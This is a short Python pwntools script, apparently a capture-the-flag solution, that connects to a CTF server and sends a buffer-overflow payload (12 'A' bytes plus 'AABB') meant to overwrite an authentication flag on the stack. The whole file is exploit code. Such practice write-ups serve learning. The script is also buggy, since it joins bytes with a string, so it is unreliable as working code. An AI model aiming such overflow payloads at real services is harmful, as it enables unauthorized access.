from pwn import *

r = remote('ctf99x.cs.ui.ac.id', 10001)
# r = process('./soal1')

# auth flag: ebp-0x28
payload = b'A'*12 + 'AABB'
print('len', len(payload))
r.sendline(payload)
print(r.recvline())
print(r.recvline())
print(r.recvline())